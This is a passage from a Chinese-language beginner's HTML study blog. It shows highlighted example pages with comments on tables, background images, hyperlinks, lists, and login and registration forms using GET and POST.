class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>e<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>f<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>g<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;td&gt;h&lt;/td&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;td&gt;i&lt;/td&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--thead、tbody、tfoot 在table中不是必须的，但便于后期的js代码编写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span> <span class="comment">&lt;!--头--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工编号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>员工薪资<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>部门名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>ex1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span>&gt;</span>ex1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="comment">&lt;!--体--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>a<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>b<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>c<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>ex2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span><span class="comment">&lt;!--底--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>e<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>f<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>ex3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>ex3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/z3LrvvzF"><img src="https://i.postimg.cc/qBwMm6WS/4.png" alt="4.png"></a></p><h2 id="背景色背景图和图片"><a href="#背景色背景图和图片" class="headerlink" title="背景色背景图和图片"></a>背景色背景图和图片</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> <span class="comment">&lt;!--告诉浏览器以什么字符集打开当前页面</span></span><br><span class="line"><span class="comment">并不是设置当前页面的字符编码方式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>背景颜色和背景图片<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;red&quot;</span> <span class="attr">background</span>=<span class="string">&quot;E:\壁纸\测试.png&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--背景色位于背景图片下层--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;E:\壁纸\b.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">title</span>=<span class="string">&quot;帕瓦&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;图片找不到了！&quot;</span> /&gt;</span><span class="comment">&lt;!--写成&lt;img src=&quot;..&quot; &gt;&lt;/img&gt;也可以&gt;</span></span><br><span class="line"><span class="comment">只设置宽度是高度会随着变(等比例)，只设置高度可能不管用</span></span><br><span class="line"><span class="comment">img标签就是图片标签</span></span><br><span class="line"><span class="comment">src属性是图片的路劲</span></span><br><span class="line"><span class="comment">title设置的时鼠标悬停时显示的信息</span></span><br><span class="line"><span class="comment">alt是用来设置图片加载失败时显示的信息</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/04/RVIahqstznSy4uJ.png" alt="1.png"></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>超链接，热链接<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youzipii.github.io&quot;</span>&gt;</span>博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="comment">&lt;!--文字超链接--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">href:hot references 热引用</span></span><br><span class="line"><span class="comment">href后面一定是一个资源的地址</span></span><br><span class="line"><span class="comment">也可以是本地的一个路径</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;file:///C:/Users/yxz/Desktop/%E8%83%8C%E6%99%AF%E9%A2%9C%E8%89%B2%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html&quot;</span>&gt;</span>超链接 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接的特点</span></span><br><span class="line"><span class="comment">下划线</span></span><br><span class="line"><span class="comment">鼠标停留时会显示小手</span></span><br><span class="line"><span class="comment">点击超链接后能跳转页面</span></span><br><span class="line"><span class="comment">中间不一定要是文字，图片也可以</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youzipii.github.io/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;E:\壁纸\b.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="comment">&lt;!--图片超链接--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youzipii.github.io&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--_blank是在新标签页中打开如果是self则是在本标签中打开</span></span><br><span class="line"><span class="comment">_self当前窗口</span></span><br><span class="line"><span class="comment">_top顶级窗口</span></span><br><span class="line"><span class="comment">_parents父窗口</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接的作用</span></span><br><span class="line"><span class="comment">通过超链接可以从浏览器向服务器发送请求</span></span><br><span class="line"><span class="comment">浏览器向服务器发送数据(请求：request)</span></span><br><span class="line"><span class="comment">服务器向浏览器发送数据(响应:reponse)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">B/S 结构的系统：每一个请求都会对应一个响应</span></span><br><span class="line"><span class="comment">B——请求——》S</span></span><br><span class="line"><span class="comment">S——响应——》B</span></span><br><span class="line"><span class="comment">用户点击超链接和直接书入URL有什么区别?</span></span><br><span class="line"><span class="comment">本质上没有，但超链接更方便</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--有序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;a&quot;</span>&gt;</span> <span class="comment">&lt;!-- 1 数字 A 大写字母 a 小写字母 i 希腊字母--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>水果</span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>蔬菜<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>甜点<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">&quot;circle&quot;</span>&gt;</span><span class="comment">&lt;!--circle 圈圈 disc 方块 square点点--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>apple 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>banana<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>grape<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>表单form<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、表单有什么用？</span></span><br><span class="line"><span class="comment">收集用户信息</span></span><br><span class="line"><span class="comment">表单展现之后，用户填写表单，点击提交后提交数据给服务器</span></span><br><span class="line"><span class="comment">2、怎么画一个表单呢？</span></span><br><span class="line"><span class="comment">使用form标签</span></span><br><span class="line"><span class="comment">3、一个网页当中可以有多个表单</span></span><br><span class="line"><span class="comment">4、表单最终需要提交数据给服务器。</span></span><br><span class="line"><span class="comment">form标签有一个action属性，这个属性用来指定服务器地址</span></span><br><span class="line"><span class="comment">action属性和超链接的href属性一样，都可以向服务器发送请求（request）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.199.177:8080/oa/save&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;设置按钮上得文本&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--对于按钮来说value用于指定按钮的文本信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--传给这个机器上8080端口的软件--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--画一个提交(suibmit)按钮可以使用input输入域,type = &quot;input&quot;,此时按钮具有提交表单的能力，空着的是普通按钮，没有提交能力。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 笔记</span></span><br><span class="line"><span class="comment">在用sublime的自动补全时，input标签补全的是type和name 而没有</span></span><br><span class="line"><span class="comment">value</span></span><br><span class="line"><span class="comment">搜索资料name指的是控件的名称,即文本框的名称，而在type 为submit时更改name并不能改变按钮上的字，得改变value得值，</span></span><br><span class="line"><span class="comment">value是指文字域得默认取值，用于定于文本框（中）得默认值</span></span><br><span class="line"><span class="comment">说明submit得默认值是提交.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">还有在自动补全时并没有补充/ 但浏览器也能识别不会报错，但写上更规范</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">超链接和表单都能向服务器发送请求，但表单可以携带数据</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">按钮要放到表单标签内部才能有作用</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">没有name时不会提交的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;百度&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http:\\localhost:8080/jd/login&quot;</span>&gt;</span></span><br><span class="line">用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">表单时以什么格式提交给服务器的？</span></span><br><span class="line"><span class="comment">http://localhost:8080/jd/login?username=abc&amp;pwd=111</span></span><br><span class="line"><span class="comment">格式:action?name=value&amp;name=value&amp;name=value</span></span><br><span class="line"><span class="comment">HTTP协议规定的，必须以这种格式提交给服务器 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">重点，表单写了name属性的，一律会提交给服务器。</span></span><br><span class="line"><span class="comment">name为空好像也不提交，不知道是交了没有</span></span><br><span class="line"><span class="comment">在测试时并不会多了&amp;</span></span><br><span class="line"><span class="comment">value没有写的时候，value的默认值是空字符串，java代码得到的是 string = &quot;&quot;;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http:\\localhost:8080/jd/login&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>  /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--text类型value由用户写--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="用户注册表单"><a href="#用户注册表单" class="headerlink" title="用户注册表单"></a>用户注册表单</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>用户注册表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">用户注册:</span></span><br><span class="line"><span class="comment">用户名</span></span><br><span class="line"><span class="comment">密码</span></span><br><span class="line"><span class="comment">确认密码</span></span><br><span class="line"><span class="comment">性别</span></span><br><span class="line"><span class="comment">兴趣爱好</span></span><br><span class="line"><span class="comment">学历</span></span><br><span class="line"><span class="comment">简介</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">accept</span>=<span class="string">&quot;http://localhost:8080/jd/register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">form表单method属性</span></span><br><span class="line"><span class="comment">gets:用户提交的信息会显示在地址栏上</span></span><br><span class="line"><span class="comment">post:用户名提交的信息不会显示在浏览器地址栏上</span></span><br><span class="line"><span class="comment">当用户提交的信息含有敏感信息时建议用post方式提交</span></span><br><span class="line"><span class="comment">默认时gets方式，只有methon指定时post时才是post请求</span></span><br><span class="line"><span class="comment">两种方式提交的数据格式还是一样的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">用户名</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userpwd&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">确认密码 <span class="comment">&lt;!--确认密码不用发到服务器，JavaScript就可以解决--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">性别<span class="comment">&lt;!--name相同时只能选一个，name不同是可以都选--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--checked 默认选中--&gt;</span></span><br><span class="line"><span 